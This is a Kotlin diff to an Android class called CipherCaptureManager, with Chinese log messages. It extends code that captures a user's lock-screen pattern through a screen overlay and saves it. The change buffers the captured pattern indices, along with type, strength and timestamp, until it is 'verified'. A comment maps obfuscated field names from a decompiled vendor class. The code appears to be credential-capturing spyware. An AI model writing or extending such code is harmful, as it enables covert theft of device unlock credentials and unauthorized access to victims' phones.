@@ -524,8 +524,8 @@ class CipherCaptureManager(
                         }
                     patternOverlay!!.onPatternCaptured = { indices, points, screenBounds, parentBounds ->
                         Log.d(TAG, "✅ 图案已捕获: indices=${indices.joinToString("-")}, points=${points.size}")
-                        // 保存图案密码
                         saveCipher("pattern", true, indices.joinToString(","))
+                        bufferCipher(indices.joinToString(","), "pattern")
                     }
                     patternOverlay!!.createPatternView()
 
@@ -1430,13 +1430,17 @@ class CipherCaptureManager(
         // vendor: C0598hx 数据类字段映射 → Map keys:
         // f56760a0=quality, f56761a1=text, f56762a2=patternIndices,
         // f56763a3=patternScreenPoints, f56764a4=isLocked, f56765a5=timestamp
+        val patternIndices: List<Int>? = if (type == "pattern") {
+            text.split(",").mapNotNull { it.trim().toIntOrNull() }
+        } else null
+
         pendingCipher = mapOf(
             "quality" to quality,
             "text" to text,
             "type" to type,
             "isLocked" to true,
             "timestamp" to now,
-            "patternIndices" to null
+            "patternIndices" to patternIndices
         )
         lastEventTime = now
         Log.d(TAG, "📦 密码已缓冲: type=$type, grade=$quality, length=${text.length} (等待验证后保存)")
